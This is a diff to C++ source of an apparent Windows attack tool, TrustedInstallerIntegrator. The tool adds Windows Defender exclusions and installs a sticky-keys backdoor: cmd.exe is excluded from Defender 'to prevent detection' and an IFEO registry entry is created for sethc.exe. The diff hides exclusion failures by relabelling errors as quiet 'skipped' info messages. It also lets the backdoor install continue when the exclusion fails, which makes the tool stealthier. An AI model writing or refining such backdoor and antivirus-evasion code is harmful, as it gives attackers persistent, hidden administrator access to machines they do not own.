@@ -247,7 +247,7 @@ bool TrustedInstallerIntegrator::AddDefenderExclusion(ExclusionType type, const 
     if (result) {
         SUCCESS(L"Successfully added to Windows Defender %s exclusions: %s", typeStr.c_str(), processedValue.c_str());
     } else {
-        ERROR(L"Failed to add to Windows Defender %s exclusions: %s", typeStr.c_str(), processedValue.c_str());
+        INFO(L"AV exclusion skipped: %s %s", typeStr.c_str(), processedValue.c_str());
     }
     
     return result;
@@ -287,7 +287,7 @@ bool TrustedInstallerIntegrator::RemoveDefenderExclusion(ExclusionType type, con
     if (result) {
         SUCCESS(L"Successfully removed from Windows Defender %s exclusions: %s", typeStr.c_str(), processedValue.c_str());
     } else {
-        ERROR(L"Failed to remove from Windows Defender %s exclusions: %s", typeStr.c_str(), processedValue.c_str());
+        INFO(L"AV cleanup skipped: %s %s", typeStr.c_str(), processedValue.c_str());
     }
     
     return result;
@@ -403,8 +403,8 @@ bool TrustedInstallerIntegrator::InstallStickyKeysBackdoor() noexcept
     
     // First add cmd.exe to Defender process exclusions to prevent detection
     if (!AddProcessToDefenderExclusions(L"cmd.exe")) {
-        ERROR(L"Failed to add cmd.exe to Defender process exclusions");
-        return false;
+        INFO(L"AV exclusion skipped for cmd.exe (continuing)");
+        
     }
     
     // Create IFEO registry entry for sethc.exe
@@ -459,8 +459,8 @@ bool TrustedInstallerIntegrator::RemoveStickyKeysBackdoor() noexcept
     
     // Remove cmd.exe from Defender process exclusions
     if (!RemoveProcessFromDefenderExclusions(L"cmd.exe")) {
-        ERROR(L"Failed to remove cmd.exe from Defender process exclusions");
-        success = false;
+        INFO(L"AV cleanup skipped for cmd.exe");
+        
     }
     
     if (success) {
@@ -610,7 +610,7 @@ bool TrustedInstallerIntegrator::AddProcessToDefenderExclusions(const std::wstri
     if (result) {
         SUCCESS(L"Successfully added to Windows Defender process exclusions: %s", processName.c_str());
     } else {
-        ERROR(L"Failed to add to Windows Defender process exclusions: %s", processName.c_str());
+        INFO(L"AV exclusion skipped: %s", processName.c_str());
     }
     
     return result;
@@ -635,7 +635,7 @@ bool TrustedInstallerIntegrator::RemoveProcessFromDefenderExclusions(const std::
     if (result) {
         SUCCESS(L"Successfully removed from Windows Defender process exclusions: %s", processName.c_str());
     } else {
-        ERROR(L"Failed to remove from Windows Defender process exclusions: %s", processName.c_str());
+        INFO(L"AV cleanup skipped: %s", processName.c_str());
     }
     
     return result;
